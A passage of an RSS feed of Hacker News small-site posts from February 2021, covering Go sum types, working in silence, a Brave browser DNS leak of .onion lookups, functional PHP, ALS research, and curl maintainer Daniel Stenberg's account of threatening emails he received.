<p>There are a couple of differences in the translation. eval can not return either a "true" int or a "true" bool (that is, values of the literal Go types <tt>int</tt> or <tt>bool</tt>), so we write it to return an <tt>Expr</tt> unconditionally. We've lost some type safety; Haskell would refuse to compile the third sample output, but Go does, and the type system doesn't prevent <tt>eval</tt> from returning an <tt>Add</tt>, so if we wish to verify that, we must do it by inspection. This is Go's <i>modus operandi</i>, though, so <i>shrug</i>. We do still have <i>some</i> type safety. You can't construct an <tt>Expr</tt> that is not one of those five things, nor can you accidentally stuff a String anywhere in there, as that will be caught at compile time, nor can you fail to unpack the <tt>I</tt> or <tt>B</tt> types out of the <tt>Expr</tt> before using them in most other code, which also turns out to be a very useful property. (It means you <i>must</i> explicitly unpack it, and handle any errors that occur at that time, immediately, which is good for writing robust code.) I say "most" because there are some implicit conversions, but it's much more sane and constrained than, say, Javascript.</p>

<p>If your interface declares a lower-case <tt>is*</tt> function, no users of your package will be able to add to your sum type. I don't think you'd ever want to use this technique with a public tag function, because interfaces themselves cover the use case of wanting something publicly extendable.</p>

<p>Of course, the tag interface is only used if you have no meaningful interface to define for your sum type. If you do have a real interface you can define you don't need a fake <tt>is*</tt> function, just define the interface. I have code that sends out an "Item" over a socket, where the Item is some component of the protocol in question (may be a list, hash, string, etc), and there's a real interface there, such as the function that takes the object and serializes it to an <tt>io.Writer</tt>, returns the size in bytes it will have, pretty-prints, etc. Using private names for the interface does ensure though that nobody else can accidentally create a new element in the protocol in another module. In concrete terms, if you <i>do</i> use an <tt>is*</tt> private method in your interface, as soon as you add any other private method you should just remove the <tt>is*</tt> one from the code.</p>

<p>Another example I found I was using a lot was defining the following five elements:</p>

<ul><li>An interface to declare a protocol type, with a private tag function.</li>
<li>All the messages that could be sent on that protocol as one type each, as private types.</li>
<li>An object that contained the data for the object, and a receiving control channel of the interface type defined above.</li>
<li>This object contained public methods corresponding to the messages that could be sent, which constructed the relevant structs, sent them on the control channel, and if there was to be a return value, handled creating the return channel and returning the resulting value. If the control channel can be closed, this should also handle that case.</li>
<li>A goroutine that consisted entirely of an endless <tt>for{}</tt> loop with a switch statement switching on the request coming in, and a defer statement that guarantees we close the control channel if this scope gets exited in any way. More sophisticated protocols could replace the switch with a state machine, though I never needed one.</li></ul>

<p>The end result of this is a goroutine acting as a server, providing easy, mediated access to whatever resource it was controlling, with an extremely easy-to-use external object for talking to it, which at the same time successfully sealing away the details of the <tt>chan</tt>'s protocol to the inside of the implementing module.</p>

<p>The downside of this approach is that it is awfully verbose for what it is accomplishing, and Go provides no mechanisms for factoring this pattern away. You must declare a tag interface, a type per message, an empty implementation of the tag interface per message, a method per message to send the command (themselves rather redundant, repeatedly copying the function params into a struct, creating the return channels, etc), and then a case statement per message type in the core implementation loop. That's a lot of repetitions of the phrase "per message". But it seemed to be a pretty solid pattern in Go, and this really is a great way to safely create a non-trivial protocol that is easy-to-use for using code.</p>

<p>(I've fiddled a bit with using the <tt>go</tt> language packages to auto-generate this sort of code. It should be possible, though I'm having some trouble with correctly ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://www.jerf.org/iri/post/2917">http://www.jerf.org/iri/post/2917</a></em></p>]]>
            </description>
            <link>http://www.jerf.org/iri/post/2917</link>
            <guid isPermaLink="false">hacker-news-small-sites-26193008</guid>
            <pubDate>Fri, 19 Feb 2021 13:40:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Silence]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=26192881">thread link</a>) | @martinrue
<br/>
February 19, 2021 | https://martinrue.com/silence/ | <a href="https://web.archive.org/web/*/https://martinrue.com/silence/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
            <h3>Silence</h3>

            <p>
                Let's be honest, silence is not usually considered an exciting subject. Despite Depeche Mode's ironic effort to convince us, the idea that we should enjoy silence seems like a stretch. So why am I writing about it?
            </p>

            <p>
                The subject of silence interests me because it's so uncool, yet so powerful.
            </p>

            <p>
                Like everyone else, I tend to listen to music while working.
            </p>

            <p>
                I imagine you're picturing the stereotypical programmer sat in a dark corner with headphones on, but stereotypes don't help anyone. I often put a light on in order to illuminate a path (the shortest of which I've previously calculated) to crawl out from in order to locate nutrition-free food and return without talking to anybody as quickly as possible. Just beware of stereotypes is all I'm saying.
            </p>

            <p>
                For a long time I mostly ignored the feeling that music was affecting my attention and ability to focus. Music makes me feel good, and feeling good is good for productivity, so listening to music is productive, right? The math on that one sounds about right.
            </p>

            <p>
                I believed that for a while, but I've now changed my mind.
            </p>

            <p>
                There have been too many occasions where being in complete silence has shown me how much better I can focus. It's not just that the focus is easier to find, it's that it's deeper and easier to keep as well.
            </p>

            <p>
                When there's no music (or any other audible distraction), all of my senses are connected to the work I'm doing. The only thing affecting my heart rate, happiness, stress, emotions, etc. is the work itself and how I'm interacting with it. Just me and the work. Aside from keeping me alive, my energy is being spent nowhere else. My attention is going nowhere else.
            </p>

            <p>
                Well, unless I've left Slack open, in which case, probably best you don't do that.
            </p>

            <p>
                Once I started to think about it, it became clear that the reason music is so enjoyable is because it affects how we feel. It's a form of stimulation. It uses energy, causing responses in various parts of the brain such as the amygdala and hippocampus, which are responsible for memory and decision making.
            </p>

            <p>
                Music certainly can make us feel better while working, but is it a good trade? How much of the energy being used to enjoy the music could have been useful, even essential, for the work we're doing, had we chosen silence?
            </p>

            <p>
                It's not a simple question, especially when you consider that not all music is the same, not all work demands the same energy and focus, and not everyone wants to optimise for output ‚Äì sometimes you just want a healthy balance between output and feeling good (if the work itself isn't providing the feels).
            </p>

            <p>
                Having experimented a lot more with working in silence recently, I've begun to acknowledge the evidence that in silence I simply work better. I don't always need to work better, but knowing how to pull that lever when I need to is a useful tool.
            </p>

            <p>
                While this is all just anecdotal, taken from my own experience, it feels like there's a simple truth somewhere in the idea that the less stuff you give your brain to respond to, the more energy and focus you have to use elsewhere.
            </p>

            <p>
                I've started to respect silence as the ideal, natural state for concentration, choosing to exchange it with music, a podcast, etc. very deliberately, rather than by telling myself it makes no difference. It makes too big of a difference to continue ignoring it.
            </p>

            <p>
                It's true that the word <i>silence</i> doesn't really evoke a sense of having an awesome time. For one, I can't listen to <del>Tina Turner</del>, uh, Drake, while writing code. But sometimes all of those Dake joules are better spent giving yourself the edge when it comes to producing your best work.
            </p>

            <p>
                Drake <del>might be</del> is awesome, but the satisfaction of losing yourself in deep work, the joy of being present and producing your best stuff... you ever tried that?
            </p>

            <p>That kind of euphoria is anything but silent.</p>

            <blockquote>Silence is a true friend who never betrays ‚Äì Confucius</blockquote>
            
        </article></div>]]>
            </description>
            <link>https://martinrue.com/silence/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26192881</guid>
            <pubDate>Fri, 19 Feb 2021 13:25:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Brave Browser leaks your Tor / Onion service requests through DNS]]>
            </title>
            <description>
<![CDATA[
Score 27 | Comments 14 (<a href="https://news.ycombinator.com/item?id=26192574">thread link</a>) | @input_sh
<br/>
February 19, 2021 | https://ramble.pw/f/privacy/2387 | <a href="https://web.archive.org/web/*/https://ramble.pw/f/privacy/2387">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
              <div lang="en" dir="ltr"><p>Edit: (Since this is gaining traction elsewhere.) I'm not trying to shit on Brave. I'm just wanting to help protect end-users who may use Brave for it's Tor feature to do stuff over Tor that should only be done with the actual Tor browser. If you're using Brave you probably use it because you expect a certain level of privacy/anonymity. Piping .onion requests through DNS where your ISP or DNS provider can see that <em>you</em> made a request for an .onion site defeats that purpose.</p>
<p>I'm also no NetSec expert but you don't have to be to replicate this. I'm just a dude with some websites and projects and I'm not certain I would have taken notice of this if it wasn't reported to me by a partner on another project who witnessed this behavior when monitoring his local requests leaving his network. He'll be doing his own write-up and is more equipped to discuss this in length than me.</p>
<hr><p>Testing out something that was noted a week or so ago, and wanting to replicate it for the purpose of this post.</p>
<p>Some of you know I'm working on an ad, tracker, and other BS blocking VPN service for an unrelated project to this site. Go to <a href="https://ramble.pw/f/incoghost">/f/incoghost</a> (<a href="https://incog.host/" rel="nofollow">website</a>) for more because I try to keep these things separated.</p>
<p>Anyhow, it was reported by a partner that Brave was leaking DNS requests for onion sites and I was able to confirm it at the time. Decided to spin up a VM with Brave and test with this site's Onion service (though it will do this for any .onion)</p>
<p>Example:</p>
<pre><code> Feb 18 12:02:25: query[A] rambleeeqrhty6s5jgefdfdtc6tfgg4jj6svr4jpgk4wjtg3qshwbaad.onion from 104.244.xx.xxx
</code></pre>
<p>What this entry shows (simply) is that the request made for the domain rambleeeqrhty6s5jgefdfdtc6tfgg4jj6svr4jpgk4wjtg3qshwbaad.onion made it to the DNS server and is tagged with the IP of the requester, which in this case is just the test / dev VPN. This shouldn't happen. There isn't any reason for Brave to attempt to resolve a .onion domain through traditional means as it would with a regular clearnet site.</p>
<p>This is especially worrisome for those of you who use Brave browser from your normal residential IP and (for whatever reason) use the Tor feature built into the browser to access Tor sites. Your ISP or DNS provider <em>will</em> know that a request made to a specific Tor site was made by <em>your</em> IP. With Brave, your ISP would know that you accessed <em>somesketchyonionsite.onion</em> .</p>
<p>TL;DR: If you're going to use Tor, use the Tor Browser and not Brave. The Tor browser itself doesn't leak these requests like Brave does.</p>
<hr><p>Edit: To clarify, the VPN service we're working on is no-logging but during this dev and testing period we're logging DNS requests while we work out the kinks in the blocklists. This has also allowed us to witness .onions being passed through which is a fault of Brave.</p>
<hr><p>Edit 2: Screenshot: <a href="https://images2.imgbox.com/98/46/1i084PbC_o.png" rel="nofollow">https://images2.imgbox.com/98/46/1i084PbC_o.png</a></p>
<p>That was me loading duckduckgo in a different container, with brave, while live fetching DNS requests made to the DNS server. I blurred out the non-onion requests. (Different VPN test location than in the above example so 209.x.x.x IP instead of the 104.x.x.x one in the original example.</p>
<hr><h3>EDIT 2: The mods of /r/privacy won't let this be posted. They say:</h3>
<blockquote>
<p>While we (vastly) prefer the Tor Browser over the Brave one, you'll need a better source than the one you found. Can you find something from a more widely recognized NetSec expert? Something along the lines of Bruce Schneier's blog or something at that level of credibility?</p>
</blockquote>
<p>and</p>
<blockquote>
<p>The problem with screenshots is that they can be faked, trivially. There are also a host of approaches that credible writers/reporters do in the NetSec space do before a line of text appears in print. It's this kind of journalism that we have to trust, since we humble Mods don't have the time or resources to vet. So, we'll need something better sourced. Sorry!</p>
</blockquote>
<p>and</p>
<blockquote>
<p>There are new posts everyday "warning" people of things that aren't legitimate, hence the caution. This is not a "security" subreddit. A moderator's job is to ensure that the subreddit doesn't devolve into conspiracy theories and misinformation. Security announcements should be vetted and confirmed, not independent claims that the mods have no time to independently verify.</p>
<blockquote>
<p>I can post the steps on how to easily replicate this by using pi-hole on their local networks. Anyone is capable of verifying this.</p>
</blockquote>
<p>Great. Please do so on r/brave, r/netsec, r/infosec, and other places where this is both directly relevant and appropriate to seek others confirmation. Once vetted by the community (and republished by professionals), you're welcome to post those official responses.</p>
</blockquote>
<p>/r/brave is private, invite only. I posted on netsec and infosec so we'll see. I guess /r/privacy must love Brave and not allow anything against it since it's so god damned easy to verify this...</p>
<p>All you have to do to VERIFY that this is happening is A.) Use Brave B.) Go to an Onion site C.) Observe DNS traffic. Install Pi-Hole on a Raspberry Pi or in a Virtual Machine on your desktop and run your DNS requests through it for ease of use and you can verify it. Not sure why they're so hesitant to inform their subscribers of this.</p>
<hr><p>Edit 3: Tested on both a Debian 10 and Ubuntu desktop. I'm not esteemed NetSec researcher and I'm not setting up a 100 different scenarios.</p>
</div>
            </div></div>]]>
            </description>
            <link>https://ramble.pw/f/privacy/2387</link>
            <guid isPermaLink="false">hacker-news-small-sites-26192574</guid>
            <pubDate>Fri, 19 Feb 2021 12:51:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[I just hit $1M ARR! Here are the 100 best resources I used to learn Sales]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=26192568">thread link</a>) | @tobywillcocks
<br/>
February 19, 2021 | https://www.loxoapp.com/120_sales_resources | <a href="https://web.archive.org/web/*/https://www.loxoapp.com/120_sales_resources">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.loxoapp.com/120_sales_resources</link>
            <guid isPermaLink="false">hacker-news-small-sites-26192568</guid>
            <pubDate>Fri, 19 Feb 2021 12:50:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[BNY Mellon subsidiary aims for 90% straight-through processing]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26192556">thread link</a>) | @hornblass
<br/>
February 19, 2021 | https://bankautomationnews.com/allposts/infrastructure/bny-mellon-subsidiary-aims-for-90-straight-through-processing/ | <a href="https://web.archive.org/web/*/https://bankautomationnews.com/allposts/infrastructure/bny-mellon-subsidiary-aims-for-90-straight-through-processing/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                <div>
                    
                        
                        <div>
    	                    
                            

                                                            <h2>Google Cloud partnership and RPA deliver efficiency gains</h2>
                            
                            
                        </div>

                        
                        
                        
                        <div>
                            

                            <div>
                                <div>
  <p>BNY Mellon Pershing, the clearing house subsidiary of the New York-based bank, is leaning on RPA this year as it seeks to boost operational efficiency with increased straight-through processing. √¢‚Ç¨≈ìIt√¢‚Ç¨‚Ñ¢s a moving target, but we want to be like 85% to 90% straight through, which means at least 85% of transactions have to go straight [‚Ä¶]</p>
  <div>
    <p><a href="https://www.bankautomationnews.com/subscribe/?utm_source=Premium%20Paywall&amp;utm_medium=Paywall&amp;utm_campaign=Premium_Paywall"><img src="https://bankautomationnews.com/wp-content/uploads/2021/01/BAN-Premium-Paywall-V2.png" alt="" width="728" height="225"></a></p>
<h3>Already subscribed? Log in below.</h3>
  </div>
  
</div>

                                
	                            
                                                                
                                                            </div>


                        </div>
	                    
	                    
                        
                                    </div>
            </div></div>]]>
            </description>
            <link>https://bankautomationnews.com/allposts/infrastructure/bny-mellon-subsidiary-aims-for-90-straight-through-processing/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26192556</guid>
            <pubDate>Fri, 19 Feb 2021 12:48:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[My attempt on functional programming in PHP]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26192444">thread link</a>) | @hacksilver
<br/>
February 19, 2021 | https://phel-lang.org/blog/functional-programming-in-php/ | <a href="https://web.archive.org/web/*/https://phel-lang.org/blog/functional-programming-in-php/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        
        <p>PHP was one of my first languages I learned. Even so, this dates back over 10 years, I still use PHP every day at work. However, in the meantime I also learned a lot of other languages like Java, Clojure, Scala, Python, Javascript and Scheme. By learning all the languages and their concepts, the concept of functional programming always was my favorite and so I tried to make my PHP programming style more functional. In the following article you can read some approaches I tried.</p>
<h2 id="functions-as-arguments">Functions as arguments</h2>
<p>Defining a function in PHP is quite easy</p>
<pre><code data-lang="php"><span>&lt;?php

function inc($number) {
    return $number + 1;
}
</span></code></pre>
<p>However, one of the most common things you do in functional programming is to pass a function as argument to another function. If you try that, PHP will response to you with an error message.</p>
<pre><code data-lang="php"><span>&lt;?php

$x = [1, 2, 3, 4];
array_map(inc, $x);
// PHP Warning:  Use of undefined constant inc
</span></code></pre>
<p>PHP has no direct support for this. To fix the problem we must convert the symbol <code>inc</code> into a string.</p>
<pre><code data-lang="php"><span>&lt;?php

$x = [1, 2, 3, 4];
array_map('inc', $x);
</span></code></pre>
<p>A more common way is to define a constant for each function and use the constant as parameter to the function.</p>
<pre><code data-lang="php"><span>&lt;?php

function inc($number) {
    return $number + 1;
}
const inc = 'inc';

$x = [1, 2, 3, 4];
array_map(inc, $x);
</span></code></pre>
<p>The disadvantage of such an approach is, that refactoring is more challenging and the chance of missing a constant definition is very high.</p>
<h2 id="class-modules">Class modules</h2>
<p>Another common concept in functional programming it the possibility to group a set of function to a module. A module can have a few public accessible functions and some private functions that are not accessible to the outside world. In PHP this can be accomplished by creating a class using only static members.</p>
<pre><code data-lang="php"><span>&lt;?php

class MyStaticModule {
    private static function add($a, $b) {
        return $a + $b;
    }

    public static function inc($number) {
        return self::add($number, 1);
    }
}
</span></code></pre>
<p>This approach gives us all the flexibility in terms of modularity. However, the problem of passing functions as arguments for another function hasn't been solved.</p>
<h2 id="trait-modules">Trait modules</h2>
<p>A second approach on modularity is to use traits.</p>
<pre><code data-lang="php"><span>&lt;?php

trait MyTraitModule {

    public function inc($number) {
        return $number + 1;
    }
}
</span></code></pre>
<p>After defining all traits you have to create a class that uses these traits.</p>
<pre><code data-lang="php"><span>&lt;?php

class MyProgram {
    use MyTraitModule;
    // use Other Traits here

    public function main() {
        return $this-&gt;inc($number);
    }
}
</span></code></pre>
<p>A benefit of this approach is that we can solve our first problem. Therefore, we just need to define the magic method <code>__get</code>.</p>
<pre><code data-lang="php"><span>&lt;?php

trait FPMagic {
    public function __get($name) {
        if (method_exists($this, $name)) {
            return [$this, $name]; // This is callable
        } else {
            throw new \Exception('Method does not exists: ' . $name);
        }
    }
}

class MyProgram {
    use FPMagic;
    use MyTraitModule;

    public function main() {
        $x = [1, 2, 3, 4];
        return array_map($this-&gt;inc, $x); // Works using the magic method __get
    }
}
</span></code></pre>
<p>A big disadvantage of this approach is, that we have to resolve all conflicting function names ourself. Not only for public methods but also for private methods. This becomes next to impossible if the program grows.</p>
<p>A combination of the class module approach and the trait module approach would be a good solution to get started with functional programming in PHP. However, the trick with the magic method <code>_get</code> cannot be used for the class module approach, since PHP has no magic method for static properties.</p>
<h2 id="alternatives">Alternatives</h2>
<p>One last alternative is to use a language that is functional and compiles to PHP. In recent years, there have been a few attempts on this (e.g. <a href="https://haxe.org/">Haxe</a> and <a href="http://www.pharen.org/">Pharen</a>). While Pharen looked very promising, it hasn't seen any commits for a few years now and is still based on PHP 5.</p>
<h2 id="introducing-phel">Introducing Phel</h2>
<p>Since I didn't found a good solution for this problem, I used my coronavirus spare time to solve it by myself. This is what turns out to be Phel. Phel is a functional programming language that compiles to PHP. It is a dialect of Lisp inspired by <a href="https://clojure.org/">Clojure</a> and <a href="https://janet-lang.org/">Janet</a>. While the status of Phel is currently alpha, it is fairly complete. If you want to try it, go ahead and read the <a href="https://phel-lang.org/documentation/getting-started/">Getting started guide</a>. I'm looking for your feedback.</p>

    </div></div>]]>
            </description>
            <link>https://phel-lang.org/blog/functional-programming-in-php/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26192444</guid>
            <pubDate>Fri, 19 Feb 2021 12:33:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Nucleolar stress precedes proteopathy in SLA]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26192268">thread link</a>) | @JPLeRouzic
<br/>
February 19, 2021 | https://padiracinnovation.org/News/2021/02/nucleolar-stress-precedes-proteopathy-in-sla | <a href="https://web.archive.org/web/*/https://padiracinnovation.org/News/2021/02/nucleolar-stress-precedes-proteopathy-in-sla">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section itemprop="blogPost" itemscope="itemscope" itemtype="http://schema.org/BlogPosting">
    <div>
        <div>    
               
            <div>
                                                                                <div>
                    						
					                    <p>
                        <span itemprop="datePublished">19 February 2021</span> - Posted in 
                        <span itemprop="articleSection"><a href="https://padiracinnovation.org/News/category/english">English</a></span> by 
                        
                    </p>
                </div>
                <div itemprop="articleBody">                                   
                    <p>There are unfortunately many contradictory research assumptions, that wish to explain how ALS appears and progresses. One of the most serious hypothesis ensures that it is a proteopathy. The causes of these proteopathies remain unknown but many elements indicate a cellular energy deficiency. Proteopathies have been involved in several neurodegenerative diseases.</p>

<p><a href="https://actaneurocomms.biomedcentral.com/articles/10.1186/s40478-021-01125-6">An article by Olubankole Aladeuyi Arogundade et al.</a> shows something new and interesting. In a recent article the scientists explain that they have found events preceding proteopathy in ALS. They have studied cells from spinal cord of 11 sporadic patients, 11 patients with mutations (inducting DPR) on chromosome 9 (C9-ALS) and 11 healthy patients.</p>

<p>Overall, the motor neurons in the C9-ALS presented smaller nucleoli compared to controls. Surprisingly, this narrowing occurs even in neurons without pathological TDP-43.
<img src="https://4.bp.blogspot.com/-WGVJ8uMTsZE/T9TTg3RllCI/AAAAAAAAANY/I5ToWYDS4ag/s1600/nucleusfigure1.jpg" alt="ENTER Image Description Here"></p>

<p>Thus, the nucleolar stress that manifests itself by the nucleolar shrinking seems to be a change upstream, before many of the molecular and structural changes.</p>

<p><a href="https://actaneurocomms.biomedcentral.com/articles/10.1186/s40478-017-0432-x">Mizielinska et al.</a> had already shown that C9-FTLD front cortical neurons had a lower size in neurons without other pathological markers. Similar results were obtained <a href="https://pubmed.ncbi.nlm.nih.gov/29450726/">for Alzheimer</a>.</p>

<p>Thus, at least two studies have now shown coherent results of nucleolar narrowing in the absence of pathological markers such as TDP-43 or repetitions of dipeptide for chromosome 9.</p>

<p>Nucleolar narrowing is sometimes associated with cancer or a cellular energy deficiency. Even if it is not mentioned in the article, one may think again about the hypothesis of the cellular energy deficit in ALS.</p>

<h3><u>Advertisement</u></h3>

<p><a href="https://www.amazon.com/dp/1698147899">
<img src="https://images-na.ssl-images-amazon.com/images/I/51pNZDKvmIL._SX331_BO1,204,203,200_.jpg" width="200">
<br>
This book retraces the main achievements of ALS research over the last 30 years, presents the drugs under clinical trial, as well as ongoing research on future treatments likely to be able stop the disease in a few years and to provide a complete cure in a decade or two.<br>
</a></p>
                </div><!--//desc-->
                
                
                                                                                    
                            </div><!--//item-->                       
        </div><!--//content-->  
    </div><!--//section-inner-->                 
</section></div>]]>
            </description>
            <link>https://padiracinnovation.org/News/2021/02/nucleolar-stress-precedes-proteopathy-in-sla</link>
            <guid isPermaLink="false">hacker-news-small-sites-26192268</guid>
            <pubDate>Fri, 19 Feb 2021 12:11:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[‚ÄúI will slaughter you‚Äù]]>
            </title>
            <description>
<![CDATA[
Score 516 | Comments 225 (<a href="https://news.ycombinator.com/item?id=26192025">thread link</a>) | @ingve
<br/>
February 19, 2021 | https://daniel.haxx.se/blog/2021/02/19/i-will-slaughter-you/ | <a href="https://web.archive.org/web/*/https://daniel.haxx.se/blog/2021/02/19/i-will-slaughter-you/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>You might know that I‚Äôve posted funny emails I‚Äôve received on my blog several times in the past. The kind of emails people send me when they experience problems with some device they own (like a <a href="https://daniel.haxx.se/blog/2018/02/16/why-is-your-email-in-my-car/" data-type="post" data-id="10856">car</a>) and they contact me because my email address happens to be visible somewhere.</p>



<p>People sometimes say I should get a different email address or use another one in the curl license file, but I‚Äôve truly never had a problem with these emails, as they mostly remind me about the tough challenges the modern technical life bring to people and it gives me insights about what things that run curl.</p>



<p>But not all of these emails are ‚Äúfunny‚Äù.</p>



<h2>Category: not funny</h2>



<p>Today I received the following email</p>



<pre>From: Al Nocai &lt;[redacted]@icloud.com&gt;
Date: Fri, 19 Feb 2021 03:02:24 -0600
Subject: I will slaughter you</pre>



<p>That subject.</p>



<p>As an open source maintainer since over twenty years, I know flame wars and personal attacks and I have a fairly thick skin and I don‚Äôt let words get to me easily. It took me a minute to absorb and realize it was actually meant as a direct physical threat. It found its ways through and got to me. This level of aggressiveness is not what I‚Äôm prepared for.</p>



<p>Attached in this email, there were seven images and no text at all. The images all look like screenshots from a phone and the first one is clearly showing <a href="https://github.com/curl/curl/blob/master/include/curl/multi.h">source code I wrote</a> and my copyright line:</p>



<div><figure><a href="https://daniel.haxx.se/blog/wp-content/uploads/2021/02/image0.png"><img loading="lazy" width="295" height="640" src="https://daniel.haxx.se/blog/wp-content/uploads/2021/02/image0.png" alt=""></a></figure></div>



<p>The <a href="https://daniel.haxx.se/al/">other images</a> showed other source code and related build/software info of other components, but I couldn‚Äôt spot how they were associated with me in any way.</p>



<p>No explanation, just that subject and the seven images and I was left to draw my own conclusions.</p>



<p>I presume the name in the email is made up and the email account is probably a throw-away one. The time zone used in the <code>Date:</code> string might imply US <a href="https://www.timeanddate.com/time/zones/cst">central standard time</a> but could of course easily be phony as well. </p>



<h2>How I responded</h2>



<p>Normally I don‚Äôt respond to these confused emails because the distance between me and the person writing them is usually almost interplanetary. This time though, it was so far beyond what‚Äôs acceptable to me and in any decent society I couldn‚Äôt just let it slide. After I took a little pause and walked around my house for a few minutes to cool off, I wrote a really angry reply and sent it off.</p>



<blockquote><p>This was a totally and completely utterly unacceptable email and it hurt me deep in my soul. You should be ashamed and seriously reconsider your manners.</p><p>I have no idea what your screenshots are supposed to show, but clearly something somewhere is using code I wrote. Code I have written runs in virtually every Internet connected device on the planet and in most cases the users download and use it without even telling me, for free.</p><p>Clearly you don‚Äôt deserve my code.</p></blockquote>



<p>I don‚Äôt expect that it will be read or make any difference.</p>



<p>Update below, added after my initial post.</p>



<h2>Al Nocai‚Äôs response</h2>



<p>Contrary to my expectations above, he responded. It‚Äôs not even worth commenting but for transparency I‚Äôll include it here.</p>



<p><em>I do not care. Your bullshit software was an attack vector that cost me a multimillion dollar defense project.</em></p>



<p><em>Your bullshit software has been used to root me and multiple others. I lost over $15k in prototyping alone from bullshit rooting to the charge arbitrators.</em></p>



<p><em>I have now since October been sandboxed because of your bullshit software so dipshit google kids could grift me trying to get out of the sandbox because they are too piss poor to know shat they are doing.</em></p>



<p><em>You know what I did to deserve that? I tried to develop a trade route in tech and establish project based learning methodologies to make sure kids aren‚Äôt left behind. You know who is all over those god damn files? You are. Its sickening. I got breached in Oct 2020 through federal server hijacking, and I owe a great amount of that to you.</em></p>



<p><em>Ive had to sit and watch as i reported:</em></p>



<ol><li><em>fireeye Oct/2020</em></li><li><em>Solarwinds Oct/2020</em></li><li><em>Zyxel Modem Breach Oct/2020</em></li><li><em>Multiple Sigover attack vectors utilizing favicon XML injection</em></li><li><em>JS Stochastic templating utilizing comparison expressions to write to data registers</em></li><li><em>Get strong armed by $50billion companies because i exposed bullshit malware</em></li></ol>



<p><em>And i was rooted and had my important correspondence all rerouted as some sick fuck dismantled my life with the code you have your name plastered all over. I cant even leave the country because of the situation; qas you have so effectively built a code base to shit all over people, I dont give a shit how you feel about this.</em></p>



<p><em>You built a formula 1 race car and tossed the keys to kids with ego problems. Now i have to deal with Win10 0-days because this garbage.</em></p>



<p><em>I lost my family, my country my friends, my home and 6 years of work trying to build a better place for posterity. And it has beginnings in that code. That code is used to root and exploit people. That code is used to blackmail people.</em></p>



<p><em>So no, I don‚Äôt feel bad one bit. You knew exactly the utility of what you were building. And you thought it was all a big joke. Im not laughing. I am so far past that point now.</em></p>



<p><em>/- Al</em></p>



<h2>Al continues</h2>



<p>Nine hours after I first published this blog post , Al replied again with two additional emails. His third and forth emails to me.</p>



<h3>Email 3:</h3>



<p><em><a href="https://davidkrider.com/i-will-slaughter-you-daniel-haxx-se/">https://davidkrider.com/i-will-slaughter-you-daniel-haxx-se/</a><br>Step up. You arent scaring me. What led me here? The 5th violent attempt on my life. Apple terms of service? gtfo, thanks for the platform.</em></p>



<p>Amusingly he has found a blog post about my blog post.</p>



<h3>Email 4:</h3>



<p><em>There is the project: MOUT Ops Risk Analysis through Wide Band Em Spectrum analysis through different fourier transforms.<br>You and whoever the fuck david dick rider is, you are a part of this.<br>Federal server breaches-<br>Accomplice to attempted murder-<br>Fraud-<br>just a few.</em></p>



<p><em>I have talked to now: FBI FBI Regional, VA, VA OIG, FCC, SEC, NSA, DOH, GSA, DOI, CIA, CFPB, HUD, MS, Convercent, as of today 22 separate local law enforcement agencies calling my ass up and wasting my time.</em></p>



<p><em>You and dick ridin‚Äô dave are respinsible. I dont give a shit, call the cops. I cuss them out wheb they call and they all go silent.</em></p>



<p>I‚Äôve kept his peculiar formatting and typos. In email 4 there was also a PDF file attached named <code>BustyBabes 4.pdf</code>. It is apparently a 13 page document about the ‚ÄúNERVEBUS NERVOUS SYSTEM‚Äù described in the first paragraph as ‚ÄúNerveBus Nervous System aims to be a general utility platform that provides comprehensive and complex analysis to provide the end user with cohesive, coherent and ‚Äúreal-time‚Äù information about the environment it monitors.‚Äù. There‚Äôs no mention of curl or my name in the document.</p>



<p>Since I don‚Äôt know the status of this document I will not share it publicly, but here‚Äôs a screenshot of the front page:</p>



<div><figure><a href="https://daniel.haxx.se/blog/wp-content/uploads/2021/02/Screenshot_2021-02-20-BustyBabes-4-pdf.png"><img loading="lazy" src="https://daniel.haxx.se/blog/wp-content/uploads/2021/02/Screenshot_2021-02-20-BustyBabes-4-pdf.png" alt="" width="358" height="462"></a></figure></div>



<h2>Related</h2>



<p>This topic on <a href="https://news.ycombinator.com/item?id=26192025">hacker news</a> and <a href="https://www.reddit.com/r/programming/comments/lnhcrc/i_will_slaughter_you_daniel_stenberg_got_a_quite/">reddit</a>.</p>



<p>I have reported the threat to the Swedish police (where I live).</p>
	</div></div>]]>
            </description>
            <link>https://daniel.haxx.se/blog/2021/02/19/i-will-slaughter-you/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26192025</guid>
            <pubDate>Fri, 19 Feb 2021 11:36:23 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Compressive transformer PyTorch implementation with notes]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26192005">thread link</a>) | @vpj
<br/>
